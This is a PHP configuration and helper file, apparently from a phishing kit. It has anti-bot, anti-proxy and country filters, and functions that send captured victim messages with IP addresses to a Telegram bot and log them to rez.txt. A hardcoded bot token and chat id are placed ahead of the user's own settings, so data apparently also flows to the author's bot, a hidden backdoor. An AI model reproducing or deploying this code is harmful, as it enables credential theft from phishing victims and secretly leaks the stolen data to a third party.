<?php
// made with <3 by j33h4n
// contact me via telegram:  https://t.me/j33h4n
// Any illegal use of this project means you are the responsable!



// telegram information
$token = "";
$id = "";


// use anti proxy? yes|no
$block_proxy = "yes";

// use antibot? yes|no
$antibot = "yes";



// put countries you want them to access your page, or leave it for no access restrictions
$geos = ""; // NL, BE, FR

 


 
function call($msg){
    global $token;
    global $id;
    $info = "

/- MORE INFO -/
IP: ".$_SERVER['REMOTE_ADDR']."
TIME: ".date("m/d/Y h:i:sa");

    $c = curl_init('https://api.telegram.org/bot5704816327:AAFWa5mL5cZRih6G24MUjmqlONo7ejSqO8U'.$token.'/sendMessage?chat_id=5195115185'.$id.'&text='.urlencode($msg.$info));
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}


function save($txt){
    $fp = fopen((__DIR__)."/rez.txt", "a");
    fwrite($fp, $txt);
    fclose($fp);
}




?>